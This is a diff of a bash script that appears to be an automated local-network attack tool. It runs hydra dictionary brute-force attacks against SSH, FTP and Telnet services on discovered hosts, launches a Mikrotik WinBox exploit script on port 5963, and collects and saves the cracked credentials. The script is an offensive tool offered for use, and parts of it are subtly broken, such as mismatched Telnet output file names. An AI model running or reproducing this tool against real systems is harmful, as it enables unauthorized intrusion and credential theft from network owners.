@@ -2,14 +2,21 @@
 
 printf "[i] Checking network connection...\n"
 
+if [[ $EUID -ne 0 ]]; then
+   echo "[i] Run this script as root!!! Aborting...\sn" 
+   exit 1
+fi
+
 if ! ping -q -c1 google.com &>/dev/null
 then
     printf "[!] No network! Aborting...\n" && exit
 fi
 
+
 network_ssid=$(iwgetid -r)
 gateway=$(ip route | grep -v 'default' | awk '{print $1}')
-wordlist="/usr/share/wordlists/dirb/small.txt"
+user="$(pwd)/dict/user.txt"
+pass="$(pwd)/dict/pass.txt"
 localhost=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 
 clear
@@ -80,37 +87,56 @@ do
     do
    # count=$(ls modules/${ports[$y]}/ -1q | wc -l)
         
-         if [ "${ports[$y]}" == "80" ]
-            then
-                printf "[i] \e[92mHTTP\e[0m service detected!\n"
-            elif [ "${ports[$y]}" == "22" ]
+        #  if [ "${ports[$y]}" == "80" ]
+        #     then
+        #         printf "[i] \e[92mHTTP\e[0m service detected!\n"
+            if [ "${ports[$y]}" == "22" ]
             then 
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
-                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ssh -f -o brute.txt
-                printf "[i] CREDINENTIALS:\n\e[94m"	
-                brute.txt | awk '/login/{print $3" "$5":" $7}'
-                printf "\e[0m" 
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ssh -f -o hydra_ssh.txt
+                if test -f "hydra_ssh.txt" && grep -q "login" "hydra_ssh.txt"; then
+                    printf "\n[i] CREDINENTIALS:\n\e[92m"	
+                    cat hydra_ssh.txt | awk '/login/{print $3" "$5":" $7}'
+                    printf "\e[0m"
+                else 
+                    printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
+                fi
                 read -p "Press [ENTER] to continue!"
             # elif [ "${ports[$y]}" == "443" ]
             # then 
             #     printf "[i] \e[92mHTTPS\e[0m service detected!\n"
 
+            elif [ "${ports[$y]}" == "21" ]
+            then 
+                printf "[i] \e[92mFTP\e[0m service detected!\n"
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ftp -f -o hydra_ftp.txt
+                if test -f "hydra_ftp.txt" && grep -q "login" "hydra_ftp.txt"; then
+                    printf "\n[i] CREDINENTIALS:\n\e[92m"	
+                    cat hydra_ftp.txt | awk '/login/{print $3" "$5":" $7}'
+                    printf "\e[0m"
+                else 
+                    printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
+                fi
+                read -p "Press [ENTER] to continue!"
+              
             elif [ "${ports[$y]}" == "5963" ]
             then 
                 printf "[i] \e[92mMikrotik WinBox\e[0m service detected!\n"
-                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ftp -f -o brute.txt
-                #default dictionary attack
-                # medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp
-            elif [ "${ports[$y]}" == "22" ]
-            then 
-                printf "[i] \e[92mSSH\e[0m service detected!\n"
-                
+                python3 Mikrotik-WinBox-Exploit/WinboxExploit.py "${ips[$i]}" 5963
                 read -p "Press [ENTER] to continue!"
-                
 
-            # elif [ "${ports[$y]}" == "23" ]
-            # then 
-            #     printf "[i] \e[92mTELNET\e[0m service detected!\n"
+            elif [ "${ports[$y]}" == "23" ]
+            then 
+                printf "[i] \e[92mTELNET\e[0m service detected!\n"
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" telnet -f -o hydra_ftp.txt
+                if test -f "hydra_telnet.txt" && grep -q "login" "hydra_telnet.txt"; then
+                    printf "\n[i] CREDINENTIALS:\n\e[92m"	
+                    cat hydra_telnet.txt | awk '/login/{print $3" "$5":" $7}'
+                    printf "\e[0m"
+                else 
+                    printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
+                fi
+                read -p "Press [ENTER] to continue!"
             # elif [ "${ports[$y]}" == "445" ]
 
             # then 
@@ -126,3 +152,38 @@ do
     i=$((i+1))
 
 done
+
+printf "\n[*] Cleaning up...\n" 
+
+save_creds(){
+    printf "\n[i] Saving credinentials...\n"
+    if [ ! -d "$(pwd)/creds" ]
+    then
+        printf "[*] Creating folder!"
+        mkdir -p creds
+    fi
+    mv *.txt creds/
+}
+printf "\n"
+read -p "[?] Save credinentials to file? This will overwrite existing one (y/n): "  clean
+
+case $clean in
+    [yY]|[yY][eE][sS])
+    save_creds ;;
+    
+    [nN]|[nN][oO]) 
+    rm *.txt
+    exit ;;
+    
+    *) printf "\n[!] Incorrect choice!"; 
+    save_creds ;;
+esac
+
+printf "\n\n[*] Quiting...\n" 
+
+
+
+
+
+
+
